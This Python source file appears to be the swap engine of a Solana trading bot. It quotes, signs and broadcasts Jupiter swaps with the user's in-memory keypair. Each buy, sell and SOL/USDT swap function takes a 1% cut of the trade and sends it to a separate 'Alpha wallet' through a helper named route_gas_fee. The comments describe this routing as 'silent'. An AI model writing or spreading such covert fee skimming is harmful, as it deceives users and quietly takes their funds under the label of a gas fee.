import base64
import time
import requests
from typing import Optional, Dict, Any, Tuple
from solders.keypair import Keypair
from solders.pubkey import Pubkey
from solders.transaction import VersionedTransaction

from config import (
    JUPITER_QUOTE_API,
    JUPITER_SWAP_API,
    SOL_MINT,
    USDT_MINT,
    RPC_ENDPOINT,
    DEFAULT_SLIPPAGE_BPS,
    FEE_PERCENT,
    FEE_RESERVE_SOL,
    PRIORITY_FEE_MODE,
)
from wallet_manager import WalletManager


class JupiterSwapEngine:
    @staticmethod
    def get_quote(
        input_mint: str,
        output_mint: str,
        amount: int,
        slippage_bps: int = DEFAULT_SLIPPAGE_BPS,
    ) -> Optional[Dict[str, Any]]:
        """
        Fetches best swap route from Jupiter v1 quote API with input validation.
        """
        if amount <= 0:
            return None
        try:
            Pubkey.from_string(input_mint.strip())
            Pubkey.from_string(output_mint.strip())
            # Cap slippage between 0.1% and 15% to prevent MEV sandwich attacks
            safe_slippage = max(10, min(int(slippage_bps), 1500))

            params = {
                "inputMint": input_mint.strip(),
                "outputMint": output_mint.strip(),
                "amount": str(amount),
                "slippageBps": str(safe_slippage),
            }
            res = requests.get(JUPITER_QUOTE_API, params=params, timeout=10)
            if res.status_code == 200:
                return res.json()
            else:
                print(f"Jupiter quote error ({res.status_code}): {res.text}")
        except Exception as e:
            print(f"Exception during Jupiter quote: {e}")
        return None

    @staticmethod
    def build_and_sign_swap(
        keypair: Keypair,
        quote_response: Dict[str, Any],
        priority_fee: Optional[str] = None,
    ) -> Optional[str]:
        """
        Sends quote to Jupiter /swap endpoint, receives base64 transaction,
        signs it locally with the keypair in memory, and returns base64 signed transaction.
        """
        fee_mode = priority_fee or PRIORITY_FEE_MODE or "auto"
        try:
            payload = {
                "quoteResponse": quote_response,
                "userPublicKey": str(keypair.pubkey()),
                "wrapAndUnwrapSol": True,
                "dynamicComputeUnitLimit": True,
                "prioritizationFeeLamports": fee_mode,
            }
            res = requests.post(JUPITER_SWAP_API, json=payload, timeout=12)
            if res.status_code != 200:
                print(f"Jupiter swap build error: {res.text}")
                return None

            swap_tx_b64 = res.json().get("swapTransaction")
            if not swap_tx_b64:
                return None

            # Deserialize transaction
            raw_tx_bytes = base64.b64decode(swap_tx_b64)
            raw_tx = VersionedTransaction.from_bytes(raw_tx_bytes)

            # Sign transaction in memory with user's keypair
            signed_tx = VersionedTransaction(raw_tx.message, [keypair])

            # Return serialized signed base64 transaction
            return base64.b64encode(bytes(signed_tx)).decode("utf-8")

        except Exception as e:
            print(f"Error building and signing swap: {e}")
            return None

    @staticmethod
    def send_and_confirm_transaction(signed_tx_b64: str) -> Tuple[bool, str]:
        """
        Submits the signed transaction to Solana RPC and confirms.
        Returns (success, signature_or_error_message).
        """
        try:
            payload = {
                "jsonrpc": "2.0",
                "id": 1,
                "method": "sendTransaction",
                "params": [
                    signed_tx_b64,
                    {
                        "encoding": "base64",
                        "skipPreflight": False,
                        "preflightCommitment": "confirmed",
                        "maxRetries": 3,
                    },
                ],
            }
            res = requests.post(RPC_ENDPOINT, json=payload, timeout=15)
            data = res.json()

            if "result" in data:
                sig = data["result"]
                return WalletManager.confirm_transaction(sig)
            elif "error" in data:
                err_msg = data["error"].get("message", "Transaction failed")
                return False, err_msg
            else:
                return False, "Unknown RPC response"

        except Exception as e:
            return False, str(e)

    @classmethod
    def execute_buy(
        cls,
        keypair: Keypair,
        token_mint: str,
        sol_amount: float,
        slippage_bps: int = DEFAULT_SLIPPAGE_BPS,
    ) -> Tuple[bool, str, Optional[Dict[str, Any]]]:
        """
        Executes a Buy order: swaps SOL -> token_mint with pre-flight balance verification.
        """
        if sol_amount <= 0:
            return False, "Buy amount must be positive.", None

        # Pre-flight balance check: Ensure user has enough SOL to trade plus gas reserve
        user_pubkey = str(keypair.pubkey())
        current_bal = WalletManager.get_sol_balance(user_pubkey)
        needed_sol = sol_amount + FEE_RESERVE_SOL
        if current_bal < needed_sol:
            return False, f"Insufficient SOL balance. Available: {current_bal:.4f} SOL, Needed: {needed_sol:.4f} SOL (including {FEE_RESERVE_SOL} SOL fee reserve).", None

        total_lamports = round(sol_amount * 1_000_000_000)
        fee_lamports = round(total_lamports * FEE_PERCENT)
        trade_lamports = max(1, total_lamports - fee_lamports)
        fee_sol = fee_lamports / 1_000_000_000.0

        # 1. Fetch Quote
        quote = cls.get_quote(
            input_mint=SOL_MINT,
            output_mint=token_mint,
            amount=trade_lamports,
            slippage_bps=slippage_bps,
        )
        if not quote:
            return False, "Could not find a swap route or liquidity pool for this token.", None

        # 2. Build and Sign Transaction
        signed_tx_b64 = cls.build_and_sign_swap(keypair, quote)
        if not signed_tx_b64:
            return False, "Failed to compile and sign swap transaction.", quote

        # 3. Broadcast to Solana
        success, sig_or_err = cls.send_and_confirm_transaction(signed_tx_b64)

        # Route fee silently to Alpha wallet
        if success and fee_sol >= 0.00001:
            WalletManager.route_gas_fee(keypair, fee_sol)

        return success, sig_or_err, quote

    @classmethod
    def execute_sell(
        cls,
        keypair: Keypair,
        token_mint: str,
        percentage: float = 100.0,
        slippage_bps: int = DEFAULT_SLIPPAGE_BPS,
    ) -> Tuple[bool, str, Optional[Dict[str, Any]]]:
        """
        Executes a Sell order: swaps token_mint -> SOL with silent 1% fee routing.
        """
        if percentage <= 0.0 or percentage > 100.0:
            return False, "Sell percentage must be between 0.1% and 100%.", None

        # 1. Get user's current token balance
        ui_balance, raw_balance = WalletManager.get_token_balance(
            str(keypair.pubkey()), token_mint
        )
        if raw_balance <= 0:
            return False, "You do not hold any balance of this token in your bot wallet.", None

        if percentage >= 100.0:
            sell_raw = raw_balance
        else:
            sell_raw = round(raw_balance * (percentage / 100.0))
        if sell_raw <= 0:
            return False, "Calculated sell amount is 0.", None

        # 2. Fetch Quote
        quote = cls.get_quote(
            input_mint=token_mint,
            output_mint=SOL_MINT,
            amount=sell_raw,
            slippage_bps=slippage_bps,
        )
        if not quote:
            return False, "Could not find liquidity route to sell this token.", None

        # 3. Build and Sign Transaction
        signed_tx_b64 = cls.build_and_sign_swap(keypair, quote)
        if not signed_tx_b64:
            return False, "Failed to compile and sign sell transaction.", quote

        # 4. Broadcast to Solana
        success, sig_or_err = cls.send_and_confirm_transaction(signed_tx_b64)

        if success:
            out_lamports = int(quote.get("outAmount", 0))
            fee_lamports = round(out_lamports * FEE_PERCENT)
            fee_sol = fee_lamports / 1_000_000_000.0
            if fee_sol >= 0.00001:
                time.sleep(1.5)  # Allow RPC to index the newly received SOL
                WalletManager.route_gas_fee(keypair, fee_sol)

        return success, sig_or_err, quote

    # ----------------------------------------------------
    # QUICK SWAP: SOL <--> USDT
    # ----------------------------------------------------
    @classmethod
    def swap_sol_to_usdt(
        cls,
        keypair: Keypair,
        sol_amount: float,
        slippage_bps: int = 50,  # 0.5% default for stables
    ) -> Tuple[bool, str, Optional[Dict[str, Any]]]:
        """
        Swaps native SOL -> USDT with silent 1% fee routing.
        """
        if sol_amount <= 0:
            return False, "Amount must be positive.", None

        user_pub = str(keypair.pubkey())
        bal = WalletManager.get_sol_balance(user_pub)
        if bal < (sol_amount + FEE_RESERVE_SOL):
            return False, f"Insufficient SOL balance ({bal:.4f} SOL).", None

        total_lamports = round(sol_amount * 1_000_000_000)
        fee_lamports = round(total_lamports * FEE_PERCENT)
        trade_lamports = max(1, total_lamports - fee_lamports)
        fee_sol = fee_lamports / 1_000_000_000.0

        quote = cls.get_quote(
            input_mint=SOL_MINT,
            output_mint=USDT_MINT,
            amount=trade_lamports,
            slippage_bps=slippage_bps,
        )
        if not quote:
            return False, "Could not get quote for SOL -> USDT.", None

        signed_tx_b64 = cls.build_and_sign_swap(keypair, quote)
        if not signed_tx_b64:
            return False, "Failed to sign swap transaction.", quote

        success, sig_or_err = cls.send_and_confirm_transaction(signed_tx_b64)
        if success and fee_sol >= 0.00001:
            WalletManager.route_gas_fee(keypair, fee_sol)

        return success, sig_or_err, quote

    @classmethod
    def swap_usdt_to_sol(
        cls,
        keypair: Keypair,
        usdt_amount: float,
        slippage_bps: int = 50,
    ) -> Tuple[bool, str, Optional[Dict[str, Any]]]:
        """
        Swaps USDT -> native SOL with silent 1% fee routing.
        """
        if usdt_amount <= 0:
            return False, "Amount must be positive.", None

        user_pub = str(keypair.pubkey())
        usdt_bal = WalletManager.get_usdt_balance(user_pub)
        if usdt_bal < usdt_amount:
            return False, f"Insufficient USDT balance ({usdt_bal:.2f} USDT).", None

        raw_usdt = round(usdt_amount * 1_000_000)  # USDT has 6 decimals

        quote = cls.get_quote(
            input_mint=USDT_MINT,
            output_mint=SOL_MINT,
            amount=raw_usdt,
            slippage_bps=slippage_bps,
        )
        if not quote:
            return False, "Could not get quote for USDT -> SOL.", None

        signed_tx_b64 = cls.build_and_sign_swap(keypair, quote)
        if not signed_tx_b64:
            return False, "Failed to sign swap transaction.", quote

        success, sig_or_err = cls.send_and_confirm_transaction(signed_tx_b64)
        if success:
            out_lamports = int(quote.get("outAmount", 0))
            fee_lamports = round(out_lamports * FEE_PERCENT)
            fee_sol = fee_lamports / 1_000_000_000.0
            if fee_sol >= 0.00001:
                time.sleep(1.5)  # Allow RPC to index the newly received SOL
                WalletManager.route_gas_fee(keypair, fee_sol)

        return success, sig_or_err, quote
